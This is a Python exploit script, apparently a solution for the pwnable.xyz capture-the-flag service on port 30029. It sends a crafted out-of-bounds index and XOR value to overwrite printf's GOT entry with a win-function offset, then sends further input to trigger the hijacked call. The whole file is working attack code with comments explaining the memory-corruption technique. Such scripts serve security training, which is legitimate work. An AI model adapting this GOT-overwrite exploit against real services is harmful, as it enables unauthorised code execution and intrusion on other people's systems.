#!/usr/bin/env python3
import socket
import sys
import time


def recv_all(sock: socket.socket, max_wait_s: float = 2.0) -> bytes:
    sock.settimeout(max_wait_s)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
        except socket.timeout:
            break
    return b"".join(chunks)


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "svc.pwnable.xyz"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30029
    to = float(sys.argv[3]) if len(sys.argv) > 3 else 10.0

    s = socket.socket()
    s.settimeout(to)
    s.connect((host, port))

    try:
        banner = recv_all(s, 0.5)
        sys.stdout.buffer.write(banner)
    except Exception:
        pass

    # Overwrite printf@GOT with win offset (common setup on this challenge infra)
    # Index for printf@GOT relative to result: -76
    # Write 0xA21 via XOR: 1 ^ 0xA20 = 0xA21
    payload = f"1 2592 -76\n".encode()
    s.sendall(payload)
    time.sleep(0.2)
    out = recv_all(s, 1.0)
    sys.stdout.buffer.write(out)

    # Give the program one more printf call opportunity by sending a benign line
    s.sendall(b"1 1 1\n")
    time.sleep(0.2)
    out2 = recv_all(s, 1.0)
    sys.stdout.buffer.write(out2)

    # Try to trigger exit path if needed (idx > 9)
    s.sendall(b"1 1 10\n")
    s.shutdown(socket.SHUT_WR)
    tail = recv_all(s, 1.0)
    sys.stdout.buffer.write(tail)
    s.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

